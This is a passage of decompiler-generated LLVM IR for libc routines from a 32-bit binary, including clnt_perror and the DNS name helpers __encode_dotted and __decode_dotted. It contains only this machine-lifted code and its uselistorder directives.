  %v0_805a0d6 = phi i32 [ %v2_8059fec, %dec_label_pc_8059f99 ], [ %v2_8059fec, %dec_label_pc_8059f99 ], [ %v2_8059fec, %dec_label_pc_8059f99 ], [ %v2_8059fec, %dec_label_pc_8059f99 ], [ %v2_8059fec, %dec_label_pc_8059f99 ], [ %v2_8059fec, %dec_label_pc_8059f99 ], [ %v2_8059fec, %dec_label_pc_8059f99 ], [ %v2_8059fec, %dec_label_pc_8059f99 ], [ %v2_8059fec, %dec_label_pc_8059f99 ], [ %v2_8059fec, %dec_label_pc_8059f99 ], [ %v2_8059fec, %dec_label_pc_8059f99 ], [ %v2_8059fec, %dec_label_pc_8059f99 ], [ %v2_8059fec, %dec_label_pc_8059f99 ], [ %v2_805a086, %dec_label_pc_805a072 ], [ %storemerge, %dec_label_pc_805a0d3 ]
  %v1_805a0d6 = inttoptr i32 %v0_805a0d6 to i8*
  store i8 10, i8* %v1_805a0d6, align 1
  %v0_805a0d9 = load i32, i32* @esi, align 4
  %v1_805a0d9 = add i32 %v0_805a0d9, 1
  %v2_805a0d9 = inttoptr i32 %v1_805a0d9 to i8*
  store i8 0, i8* %v2_805a0d9, align 1
  br label %dec_label_pc_805a0df

dec_label_pc_805a0df:                             ; preds = %entry, %dec_label_pc_805a0d6
  %v0_805a0e9 = phi i32 [ 0, %entry ], [ %v3_8059f88, %dec_label_pc_805a0d6 ]
  %v2_805a0e5 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805a0e5, i32* @ebx, align 4
  store i32 %v0_8059f79, i32* @esi, align 4
  store i32 %v0_8059f78, i32* @edi, align 4
  store i32 %v0_8059f77, i32* @ebp, align 4
  ret i32 %v0_805a0e9

; uselistorder directives
  uselistorder i32 %v1_805a04b, { 1, 0, 2 }
  uselistorder i32 %v1_805a042, { 1, 0 }
  uselistorder i32 %v0_805a05339, { 1, 0 }
  uselistorder i32 %v3_8059f88, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i8 10, { 14, 13, 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 (i32, i32, i32)* @__GI___glibc_strerror_r, { 2, 1, 0 }
  uselistorder i32 1024, { 12, 13, 14, 15, 29, 0, 31, 16, 25, 23, 30, 17, 10, 11, 1, 2, 3, 4, 5, 6, 7, 28, 9, 8, 26, 18, 19, 20, 21, 27, 22, 24 }
  uselistorder i32 17, { 17, 19, 0, 20, 5, 3, 18, 10, 16, 6, 7, 4, 11, 12, 13, 14, 15, 21, 9, 2, 1, 8 }
  uselistorder i32 16, { 75, 229, 230, 163, 162, 32, 164, 165, 43, 8, 166, 44, 109, 231, 45, 247, 46, 47, 48, 107, 232, 9, 10, 102, 103, 104, 105, 204, 233, 234, 106, 11, 12, 13, 241, 33, 248, 249, 250, 0, 34, 167, 168, 169, 170, 171, 172, 179, 173, 174, 175, 176, 177, 178, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 88, 89, 242, 108, 63, 67, 72, 110, 111, 112, 243, 113, 114, 115, 116, 117, 244, 90, 40, 73, 27, 91, 92, 64, 93, 94, 65, 95, 96, 97, 98, 99, 100, 101, 245, 246, 49, 77, 78, 50, 118, 119, 120, 121, 122, 123, 251, 205, 206, 207, 208, 213, 214, 235, 236, 237, 238, 239, 240, 255, 51, 52, 76, 53, 158, 66, 124, 155, 125, 263, 252, 253, 36, 35, 254, 1, 37, 68, 190, 191, 60, 14, 61, 38, 54, 274, 192, 193, 194, 195, 196, 197, 209, 210, 198, 199, 200, 201, 215, 216, 217, 218, 219, 220, 2, 221, 222, 223, 224, 225, 39, 226, 227, 69, 228, 256, 257, 258, 211, 15, 141, 126, 127, 270, 271, 272, 273, 128, 129, 130, 131, 259, 260, 261, 262, 267, 268, 269, 3, 132, 133, 212, 28, 29, 30, 31, 134, 16, 266, 17, 4, 135, 18, 136, 137, 138, 139, 19, 140, 20, 264, 275, 265, 21, 142, 143, 81, 79, 80, 82, 22, 83, 23, 84, 85, 5, 24, 86, 87, 25, 144, 26, 145, 146, 147, 6, 148, 151, 70, 71, 149, 150, 152, 7, 153, 154, 55, 56, 41, 156, 42, 157, 57, 159, 160, 161, 58, 202, 59, 203, 74, 62 }
  uselistorder i32 15, { 3, 1, 2, 5, 0, 6, 4, 7, 8 }
  uselistorder i32 14, { 5, 0, 7, 8, 9, 10, 2, 3, 6, 4, 1 }
  uselistorder i32 13, { 3, 1, 0, 5, 4, 2, 6 }
  uselistorder i32 12, { 59, 7, 177, 178, 146, 147, 148, 0, 149, 33, 90, 96, 34, 35, 181, 68, 91, 92, 93, 94, 158, 95, 8, 190, 191, 184, 192, 193, 194, 195, 196, 197, 48, 47, 12, 150, 13, 14, 15, 16, 17, 18, 19, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 185, 5, 179, 180, 97, 98, 101, 36, 102, 99, 100, 103, 20, 21, 104, 105, 37, 106, 38, 107, 108, 39, 109, 40, 110, 41, 111, 42, 112, 113, 114, 186, 115, 61, 116, 85, 22, 23, 24, 87, 25, 26, 88, 27, 28, 86, 187, 188, 189, 49, 62, 63, 46, 43, 117, 118, 119, 159, 164, 165, 166, 167, 168, 169, 170, 171, 172, 182, 183, 221, 60, 120, 141, 162, 121, 122, 232, 233, 234, 235, 236, 237, 238, 224, 225, 226, 227, 228, 229, 230, 231, 198, 216, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 50, 215, 51, 151, 152, 153, 154, 250, 155, 173, 1, 2, 174, 175, 29, 30, 176, 3, 160, 161, 52, 57, 131, 44, 123, 249, 124, 222, 246, 125, 163, 220, 126, 9, 10, 11, 223, 218, 219, 217, 239, 240, 241, 127, 128, 129, 251, 53, 58, 242, 243, 244, 245, 247, 6, 248, 130, 132, 89, 133, 134, 45, 64, 65, 66, 67, 136, 135, 4, 54, 55, 137, 138, 139, 140, 31, 32, 142, 143, 144, 145, 156, 157, 56 }
  uselistorder i32 11, { 11, 17, 18, 7, 21, 8, 13, 1, 3, 6, 12, 22, 9, 2, 19, 20, 0, 10, 4, 15, 16, 5, 14 }
  uselistorder i32 10, { 20, 16, 1, 31, 32, 33, 34, 35, 36, 2, 24, 25, 27, 26, 3, 6, 37, 7, 22, 23, 13, 38, 9, 8, 17, 4, 19, 21, 29, 10, 39, 18, 11, 0, 5, 12, 15, 28, 30, 14 }
  uselistorder i32 9, { 8, 15, 16, 17, 18, 6, 19, 0, 1, 10, 5, 20, 25, 3, 9, 2, 7, 21, 22, 23, 24, 26, 11, 12, 4, 13, 14 }
  uselistorder i32 7, { 8, 14, 15, 4, 0, 1, 13, 12, 6, 9, 5, 2, 3, 10, 17, 18, 19, 20, 11, 16, 7 }
  uselistorder i32 6, { 13, 21, 22, 2, 3, 16, 4, 17, 5, 15, 9, 23, 24, 0, 8, 14, 11, 12, 10, 27, 25, 26, 6, 1, 7, 18, 19, 20 }
  uselistorder i32 5, { 17, 28, 20, 24, 25, 26, 0, 3, 4, 29, 8, 18, 5, 21, 22, 9, 6, 19, 11, 12, 23, 13, 1, 30, 31, 14, 2, 7, 27, 10, 15, 16 }
  uselistorder i32 3, { 61, 70, 71, 72, 73, 74, 75, 38, 7, 0, 28, 10, 11, 79, 12, 67, 68, 13, 76, 39, 15, 14, 8, 4, 5, 3, 69, 62, 40, 65, 66, 80, 81, 37, 41, 9, 42, 60, 29, 45, 63, 1, 46, 47, 48, 49, 50, 51, 82, 30, 31, 52, 16, 27, 18, 19, 17, 20, 21, 22, 23, 24, 43, 77, 44, 78, 32, 33, 25, 26, 53, 34, 35, 54, 2, 55, 36, 64, 6, 56, 57, 58, 59 }
  uselistorder i32 (i8*, i32)* @strcpy, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 14, 15, 16, 17, 12, 13, 10, 11 }
  uselistorder i32 (i32)* @__GI_clnt_sperrno, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @sprintf, { 2, 5, 1, 4, 3, 0 }
  uselistorder i32 8, { 10, 74, 71, 108, 92, 107, 184, 183, 185, 11, 12, 186, 187, 188, 189, 190, 191, 0, 192, 13, 9, 98, 110, 93, 94, 95, 1, 96, 97, 203, 204, 205, 51, 245, 255, 256, 257, 258, 259, 260, 261, 262, 54, 19, 20, 21, 22, 55, 23, 24, 25, 56, 26, 57, 27, 58, 59, 120, 242, 243, 99, 100, 101, 102, 103, 2, 104, 105, 106, 109, 264, 111, 28, 29, 112, 263, 113, 114, 115, 116, 117, 118, 119, 244, 46, 121, 122, 248, 249, 123, 124, 125, 126, 75, 127, 128, 250, 82, 30, 31, 83, 32, 33, 60, 34, 84, 35, 36, 85, 86, 251, 252, 253, 254, 76, 52, 87, 88, 89, 129, 130, 206, 217, 218, 219, 220, 221, 222, 53, 223, 246, 247, 299, 300, 341, 47, 342, 70, 48, 72, 301, 37, 131, 178, 214, 132, 133, 320, 321, 322, 323, 324, 325, 326, 3, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 4, 265, 266, 267, 268, 269, 270, 62, 5, 63, 6, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 61, 288, 289, 7, 290, 291, 292, 293, 8, 294, 193, 194, 14, 15, 49, 339, 195, 207, 208, 16, 17, 73, 224, 225, 226, 227, 229, 230, 231, 228, 232, 233, 234, 235, 38, 39, 236, 237, 238, 239, 240, 241, 18, 302, 303, 304, 209, 210, 211, 212, 172, 173, 213, 334, 163, 158, 50, 134, 135, 136, 137, 138, 328, 139, 335, 336, 337, 338, 140, 141, 142, 143, 305, 306, 307, 332, 333, 216, 144, 329, 90, 145, 146, 298, 148, 149, 91, 295, 296, 297, 215, 147, 150, 309, 327, 151, 152, 153, 154, 155, 159, 340, 156, 157, 330, 331, 308, 160, 161, 162, 165, 166, 167, 168, 164, 169, 77, 78, 79, 80, 81, 170, 171, 40, 64, 65, 66, 41, 174, 175, 176, 177, 42, 67, 43, 179, 44, 68, 45, 180, 181, 182, 196, 197, 198, 199, 69, 200, 201, 202 }
  uselistorder i32 4, { 138, 236, 179, 445, 446, 352, 353, 354, 348, 346, 347, 349, 350, 351, 46, 3, 355, 356, 357, 358, 359, 360, 361, 362, 363, 67, 180, 181, 182, 68, 69, 70, 364, 101, 47, 237, 238, 447, 448, 102, 221, 160, 4, 5, 241, 306, 6, 7, 8, 183, 184, 185, 186, 187, 188, 9, 189, 190, 191, 192, 10, 11, 12, 13, 14, 454, 455, 456, 457, 458, 459, 15, 393, 193, 194, 461, 462, 478, 110, 479, 480, 481, 482, 483, 484, 485, 16, 487, 486, 264, 365, 366, 367, 368, 369, 370, 116, 371, 372, 373, 374, 119, 71, 375, 376, 377, 378, 72, 73, 74, 120, 75, 76, 77, 78, 379, 79, 380, 121, 80, 122, 123, 161, 48, 162, 49, 163, 50, 164, 51, 463, 195, 43, 449, 450, 451, 452, 103, 17, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 467, 468, 469, 218, 219, 220, 464, 465, 466, 222, 223, 224, 225, 226, 227, 228, 229, 243, 230, 231, 232, 18, 233, 234, 235, 239, 240, 489, 242, 244, 245, 81, 82, 246, 488, 453, 247, 248, 249, 250, 470, 471, 251, 252, 253, 254, 255, 256, 139, 257, 472, 473, 474, 83, 84, 165, 166, 167, 52, 168, 85, 169, 86, 124, 87, 88, 170, 89, 171, 172, 173, 174, 475, 476, 104, 136, 477, 144, 143, 145, 146, 147, 111, 258, 259, 260, 261, 262, 263, 490, 19, 394, 395, 396, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 112, 460, 518, 423, 521, 522, 0, 561, 562, 563, 523, 105, 140, 328, 330, 312, 313, 314, 315, 524, 20, 265, 266, 267, 268, 269, 125, 333, 334, 335, 117, 403, 404, 405, 406, 270, 271, 272, 273, 274, 118, 21, 275, 276, 531, 556, 534, 541, 542, 543, 544, 545, 22, 535, 536, 537, 538, 539, 1, 540, 532, 533, 491, 23, 492, 109, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 44, 513, 514, 516, 515, 24, 557, 555, 329, 126, 381, 382, 106, 383, 384, 385, 386, 53, 25, 54, 560, 26, 387, 316, 424, 27, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 90, 91, 142, 55, 442, 443, 444, 397, 28, 398, 113, 137, 399, 317, 318, 319, 114, 115, 56, 320, 321, 400, 401, 297, 296, 527, 528, 277, 278, 279, 280, 281, 127, 282, 547, 548, 550, 549, 551, 283, 284, 520, 519, 175, 29, 30, 31, 558, 559, 285, 286, 287, 525, 526, 554, 407, 409, 57, 58, 59, 408, 288, 517, 546, 107, 289, 290, 108, 291, 292, 293, 60, 61, 410, 62, 298, 294, 552, 553, 295, 529, 530, 176, 177, 63, 299, 300, 411, 301, 302, 148, 149, 32, 150, 151, 152, 153, 154, 155, 156, 157, 158, 33, 159, 141, 64, 303, 304, 305, 65, 66, 93, 92, 94, 95, 307, 34, 308, 35, 36, 37, 38, 309, 39, 310, 128, 129, 130, 96, 311, 322, 323, 324, 325, 2, 326, 327, 131, 40, 331, 332, 97, 98, 132, 336, 99, 100, 337, 338, 339, 340, 341, 133, 342, 343, 344, 345, 388, 134, 389, 390, 391, 135, 392, 402, 45, 41, 412, 42, 178 }
  uselistorder i32* @ebp, {}
  uselistorder label %dec_label_pc_805a0df, { 1, 0 }
  uselistorder label %dec_label_pc_805a0d6, { 14, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_805a0d3, { 1, 0 }
  uselistorder label %dec_label_pc_805a0cb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a053, { 1, 0 }
  uselistorder label %dec_label_pc_805a042, { 1, 0 }
}

define i32 @clnt_perror(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805a0ea = load i32, i32* @ebx, align 4
  %v0_805a0ee = load i32, i32* @global_var_80627d0, align 16
  store i32 %v0_805a0ee, i32* @ebx, align 4
  %v2_805a0fc = call i32 @__GI_clnt_sperror(i32 %arg1, i32 %arg2)
  %v0_805a101 = load i32, i32* @ebx, align 4
  store i32 %v0_805a0ea, i32* @ebx, align 4
  %v2_805a10d = call i32 @__GI_fputs(i32 %v2_805a0fc, i32 %v0_805a101)
  ret i32 %v2_805a10d

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fputs, { 6, 5, 4, 3, 1, 2, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805a115 = load i32, i32* @edi, align 4
  %v0_805a116 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_805a11d = ptrtoint i8* %arg1 to i32
  store i32 %v4_805a11d, i32* @edi, align 4
  %v1_805a17c5 = icmp eq i8* %arg1, null
  br i1 %v1_805a17c5, label %dec_label_pc_805a185, label %dec_label_pc_805a180.lr.ph

dec_label_pc_805a180.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_805a180

dec_label_pc_805a123:                             ; preds = %dec_label_pc_805a180
  %v0_805a123 = load i32, i32* @edx, align 4
  %v9_805a128 = call i32 @__GI_strchr(i8* %v1_805a180, i32 46, i32 %v0_805a123, i32 %v0_805a123)
  %v1_805a132 = icmp eq i32 %v9_805a128, 0
  br i1 %v1_805a132, label %dec_label_pc_805a13c, label %dec_label_pc_805a136

dec_label_pc_805a136:                             ; preds = %dec_label_pc_805a123
  %v1_805a138 = load i32, i32* @edi, align 4
  %v2_805a138 = sub i32 %v9_805a128, %v1_805a138
  br label %dec_label_pc_805a14a

dec_label_pc_805a13c:                             ; preds = %dec_label_pc_805a123
  %v0_805a13f = load i32, i32* @edi, align 4
  %v5_805a13f = inttoptr i32 %v0_805a13f to i8*
  %v3_805a140 = call i32 @strlen(i8* %v5_805a13f)
  br label %dec_label_pc_805a14a

dec_label_pc_805a14a:                             ; preds = %dec_label_pc_805a136, %dec_label_pc_805a13c
  %v0_805a15d = phi i32 [ %v3_805a140, %dec_label_pc_805a13c ], [ %v2_805a138, %dec_label_pc_805a136 ]
  store i32 %v0_805a15d, i32* @esi, align 4
  %v1_805a14a = icmp eq i32 %v0_805a15d, 0
  %v3_805a14a = trunc i32 %v0_805a15d to i8
  br i1 %v1_805a14a, label %dec_label_pc_805a199, label %dec_label_pc_805a14e

dec_label_pc_805a14e:                             ; preds = %dec_label_pc_805a14a
  %v1_805a152 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805a152 = sub i32 %arg3, %v1_805a152
  %v1_805a154 = add i32 %v2_805a152, -1
  %v7_805a155 = icmp ult i32 %v0_805a15d, %v1_805a154
  %v1_805a157 = icmp eq i1 %v7_805a155, false
  br i1 %v1_805a157, label %dec_label_pc_805a199, label %dec_label_pc_805a159

dec_label_pc_805a159:                             ; preds = %dec_label_pc_805a14e
  store i32 %arg2, i32* @edx, align 4
  %v4_805a15f = add i32 %v1_805a152, %arg2
  %v5_805a15f = inttoptr i32 %v4_805a15f to i8*
  store i8 %v3_805a14a, i8* %v5_805a15f, align 1
  %v0_805a162 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a162 = add i32 %v0_805a162, 1
  %v0_805a164 = load i32, i32* @edx, align 4
  %v2_805a166 = add i32 %v1_805a162, %v0_805a164
  %v0_805a168 = load i32, i32* @esi, align 4
  %v0_805a169 = load i32, i32* @edi, align 4
  %v2_805a16b = add i32 %v0_805a168, %v1_805a162
  store i32 %v2_805a16b, i32* %ebx.global-to-local, align 4
  %tmp30 = inttoptr i32 %v2_805a166 to i16*
  %v7_805a16d = call i32 @memcpy(i16* %tmp30, i32 %v0_805a169, i32 %v0_805a168)
  %v1_805a179 = add i32 %v9_805a128, 1
  br i1 %v1_805a132, label %dec_label_pc_805a185, label %dec_label_pc_805a17c

dec_label_pc_805a17c:                             ; preds = %dec_label_pc_805a159
  store i32 %v1_805a179, i32* @edi, align 4
  %v1_805a17c = icmp eq i32 %v1_805a179, 0
  br i1 %v1_805a17c, label %dec_label_pc_805a185, label %dec_label_pc_805a180

dec_label_pc_805a180:                             ; preds = %dec_label_pc_805a180.lr.ph, %dec_label_pc_805a17c
  %v0_805a127 = phi i32 [ %v4_805a11d, %dec_label_pc_805a180.lr.ph ], [ %v1_805a179, %dec_label_pc_805a17c ]
  %v1_805a180 = inttoptr i32 %v0_805a127 to i8*
  %v2_805a180 = load i8, i8* %v1_805a180, align 1
  %v3_805a180 = icmp eq i8 %v2_805a180, 0
  %v1_805a183 = icmp eq i1 %v3_805a180, false
  br i1 %v1_805a183, label %dec_label_pc_805a123, label %dec_label_pc_805a185

dec_label_pc_805a185:                             ; preds = %dec_label_pc_805a17c, %dec_label_pc_805a180, %dec_label_pc_805a159, %entry
  %tmp31 = icmp slt i32 %arg3, 1
  br i1 %tmp31, label %dec_label_pc_805a199, label %dec_label_pc_805a18c

dec_label_pc_805a18c:                             ; preds = %dec_label_pc_805a185
  %v1_805a190 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805a190 = add i32 %v1_805a190, %arg2
  %v3_805a190 = inttoptr i32 %v2_805a190 to i8*
  store i8 0, i8* %v3_805a190, align 1
  %v0_805a194 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a194 = add i32 %v0_805a194, 1
  br label %dec_label_pc_805a19c

dec_label_pc_805a199:                             ; preds = %dec_label_pc_805a14e, %dec_label_pc_805a14a, %dec_label_pc_805a185
  br label %dec_label_pc_805a19c

dec_label_pc_805a19c:                             ; preds = %dec_label_pc_805a18c, %dec_label_pc_805a199
  %storemerge3 = phi i32 [ %v1_805a194, %dec_label_pc_805a18c ], [ -1, %dec_label_pc_805a199 ]
  store i32 %v0_805a116, i32* @esi, align 4
  store i32 %v0_805a115, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i8* %v1_805a180, { 1, 0 }
  uselistorder i32 %v1_805a179, { 0, 2, 1 }
  uselistorder i32 %v0_805a168, { 1, 0 }
  uselistorder i1 %v1_805a132, { 1, 0 }
  uselistorder i32 %v9_805a128, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 5, 17, 16, 6, 14, 13, 12, 11, 10, 9, 8, 3, 7, 4, 2, 0, 1, 15 }
  uselistorder i32 46, { 1, 2, 0, 3, 4, 5 }
  uselistorder i8* null, { 4, 5, 6, 3, 8, 0, 1, 7, 9, 10, 11, 12, 2, 13, 14 }
  uselistorder label %dec_label_pc_805a19c, { 1, 0 }
  uselistorder label %dec_label_pc_805a199, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a185, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805a180, { 1, 0 }
  uselistorder label %dec_label_pc_805a14a, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_805a1a6 = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_805a1af = icmp eq i32 %arg1, 0
  br i1 %v4_805a1af, label %dec_label_pc_805a270, label %dec_label_pc_805a1ba

dec_label_pc_805a1ba:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_805a2582740 = add i32 %arg2, %arg1
  %v3_805a2582841 = inttoptr i32 %v2_805a2582740 to i8*
  %v4_805a2582942 = load i8, i8* %v3_805a2582841, align 1
  %v1_805a25c3144 = icmp eq i8 %v4_805a2582942, 0
  %v1_805a25e3245 = icmp eq i1 %v1_805a25c3144, false
  br i1 %v1_805a25e3245, label %dec_label_pc_805a1c8.lr.ph, label %dec_label_pc_805a264

dec_label_pc_805a1c8:                             ; preds = %dec_label_pc_805a1c8.lr.ph, %dec_label_pc_805a1e1
  %v0_805a1d2 = phi i32 [ %v0_805a1d2.pre, %dec_label_pc_805a1c8.lr.ph ], [ %v4_805a1ec, %dec_label_pc_805a1e1 ]
  %v8_805a1c838 = phi i1 [ %v8_805a1c83350, %dec_label_pc_805a1c8.lr.ph ], [ true, %dec_label_pc_805a1e1 ]
  %v5_805a25837.in = phi i8 [ %v5_805a2583049.in, %dec_label_pc_805a1c8.lr.ph ], [ %v4_805a258, %dec_label_pc_805a1e1 ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_805a1c8.lr.ph ], [ 0, %dec_label_pc_805a1e1 ]
  %v0_805a1cf35 = phi i32 [ %v0_805a1cf.ph46, %dec_label_pc_805a1c8.lr.ph ], [ %v2_805a1fb, %dec_label_pc_805a1e1 ]
  %v5_805a25837 = zext i8 %v5_805a25837.in to i32
  %v1_805a1cf = add i32 %v0_805a1cf35, 1
  store i32 %v1_805a1cf, i32* @esi, align 4
  %v3_805a1d2 = select i1 %v8_805a1c838, i32 2, i32 1
  %v4_805a1d2 = add i32 %v3_805a1d2, %v0_805a1d2
  store i32 %v4_805a1d2, i32* %ebp.global-to-local, align 4
  %v1_805a1d5 = and i32 %v5_805a25837, 192
  %v6_805a1da = icmp eq i32 %v1_805a1d5, 192
  %v1_805a1df = icmp eq i1 %v6_805a1da, false
  br i1 %v1_805a1df, label %dec_label_pc_805a204, label %dec_label_pc_805a1e1

dec_label_pc_805a1e1:                             ; preds = %dec_label_pc_805a1c8
  %v4_805a1ec = add i32 %v3_805a1d2, %v4_805a1d2
  store i32 %v4_805a1ec, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_805a25837.in, 64
  %v1_805a1ef = zext i8 %tmp to i32
  %v2_805a1f2 = add i32 %v1_805a1cf, %arg1
  %v3_805a1f2 = inttoptr i32 %v2_805a1f2 to i8*
  %v4_805a1f2 = load i8, i8* %v3_805a1f2, align 1
  %v5_805a1f2 = zext i8 %v4_805a1f2 to i32
  %v2_805a1f6 = mul nuw nsw i32 %v1_805a1ef, 256
  %v2_805a1fb = or i32 %v5_805a1f2, %v2_805a1f6
  store i32 %v2_805a1fb, i32* @edx, align 4
  store i32 %v1_805a221.ph47, i32* @ecx, align 4
  %v2_805a258 = add i32 %v2_805a1fb, %arg1
  %v3_805a258 = inttoptr i32 %v2_805a258 to i8*
  %v4_805a258 = load i8, i8* %v3_805a258, align 1
  %v1_805a25c = icmp eq i8 %v4_805a258, 0
  %v1_805a25e = icmp eq i1 %v1_805a25c, false
  br i1 %v1_805a25e, label %dec_label_pc_805a1c8, label %dec_label_pc_805a264

dec_label_pc_805a204:                             ; preds = %dec_label_pc_805a1c8
  %v2_805a204 = add i32 %v5_805a25837, %v1_805a221.ph47
  %v1_805a20d = add i32 %v2_805a204, 1
  store i32 %v1_805a20d, i32* @edi, align 4
  %v10_805a20e = icmp ult i32 %v1_805a20d, %arg4
  %v1_805a212 = icmp eq i1 %v10_805a20e, false
  br i1 %v1_805a212, label %dec_label_pc_805a270, label %dec_label_pc_805a214

dec_label_pc_805a214:                             ; preds = %dec_label_pc_805a204
  %v2_805a21a = add i32 %v1_805a1cf, %arg1
  %v2_805a221 = add i32 %v1_805a221.ph47, %arg3
  %v3_805a224 = inttoptr i32 %v2_805a221 to i16*
  %v4_805a224 = call i32 @memcpy(i16* %v3_805a224, i32 %v2_805a21a, i32 %v5_805a25837)
  %v0_805a22c = load i32, i32* @esi, align 4
  %v2_805a22c = add i32 %v0_805a22c, %v5_805a25837
  store i32 %v2_805a22c, i32* @edx, align 4
  br i1 %v8_805a1c838, label %dec_label_pc_805a238, label %dec_label_pc_805a236

dec_label_pc_805a236:                             ; preds = %dec_label_pc_805a214
  %v0_805a236 = load i32, i32* %ebp.global-to-local, align 4
  %v2_805a236 = add i32 %v0_805a236, %v5_805a25837
  store i32 %v2_805a236, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805a238

dec_label_pc_805a238:                             ; preds = %dec_label_pc_805a214, %dec_label_pc_805a236
  %v4_805a24f = add i32 %v2_805a204, %arg3
  %v5_805a24f = inttoptr i32 %v4_805a24f to i8*
  store i8 46, i8* %v5_805a24f, align 1
  %v0_805a252.pre = load i32, i32* @edi, align 4
  %v1_805a258.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_805a252.pre, i32* @ecx, align 4
  %v2_805a25827 = add i32 %v1_805a258.pre.pre, %arg1
  %v3_805a25828 = inttoptr i32 %v2_805a25827 to i8*
  %v4_805a25829 = load i8, i8* %v3_805a25828, align 1
  %v1_805a25c31 = icmp eq i8 %v4_805a25829, 0
  %v1_805a25e32 = icmp eq i1 %v1_805a25c31, false
  %v8_805a1c833 = icmp eq i8 %stack_var_-17.136, 0
  %v0_805a1d2.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_805a25e32, label %dec_label_pc_805a1c8.lr.ph, label %dec_label_pc_805a264

dec_label_pc_805a1c8.lr.ph:                       ; preds = %dec_label_pc_805a238, %dec_label_pc_805a1ba
  %v0_805a1d2.pre = phi i32 [ 0, %dec_label_pc_805a1ba ], [ %v0_805a1d2.pre.pre, %dec_label_pc_805a238 ]
  %v8_805a1c83350 = phi i1 [ false, %dec_label_pc_805a1ba ], [ %v8_805a1c833, %dec_label_pc_805a238 ]
  %v5_805a2583049.in = phi i8 [ %v4_805a2582942, %dec_label_pc_805a1ba ], [ %v4_805a25829, %dec_label_pc_805a238 ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_805a1ba ], [ %stack_var_-17.136, %dec_label_pc_805a238 ]
  %v1_805a221.ph47 = phi i32 [ 0, %dec_label_pc_805a1ba ], [ %v0_805a252.pre, %dec_label_pc_805a238 ]
  %v0_805a1cf.ph46 = phi i32 [ %arg2, %dec_label_pc_805a1ba ], [ %v1_805a258.pre.pre, %dec_label_pc_805a238 ]
  br label %dec_label_pc_805a1c8

dec_label_pc_805a264:                             ; preds = %dec_label_pc_805a238, %dec_label_pc_805a1e1, %dec_label_pc_805a1ba
  %v0_805a269 = phi i32 [ 0, %dec_label_pc_805a1ba ], [ %v4_805a1ec, %dec_label_pc_805a1e1 ], [ %v0_805a1d2.pre.pre, %dec_label_pc_805a238 ]
  %v8_805a1c8.lcssa = phi i1 [ false, %dec_label_pc_805a1ba ], [ true, %dec_label_pc_805a1e1 ], [ %v8_805a1c833, %dec_label_pc_805a238 ]
  %v2_805a26b = zext i1 %v8_805a1c8.lcssa to i32
  %v3_805a26b = add i32 %v0_805a269, 1
  %v4_805a26b = add i32 %v3_805a26b, %v2_805a26b
  br label %dec_label_pc_805a273

dec_label_pc_805a270:                             ; preds = %dec_label_pc_805a204, %entry
  br label %dec_label_pc_805a273

dec_label_pc_805a273:                             ; preds = %dec_label_pc_805a264, %dec_label_pc_805a270
  %storemerge = phi i32 [ -1, %dec_label_pc_805a270 ], [ %v4_805a26b, %dec_label_pc_805a264 ]
  store i32 %v0_805a1a6, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805a221.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_805a258, { 1, 0 }
  uselistorder i32 %v2_805a1fb, { 0, 2, 1 }
  uselistorder i32 %v4_805a1ec, { 0, 2, 1 }
  uselistorder i32 %v5_805a25837, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 3, 1, 4, 5 }
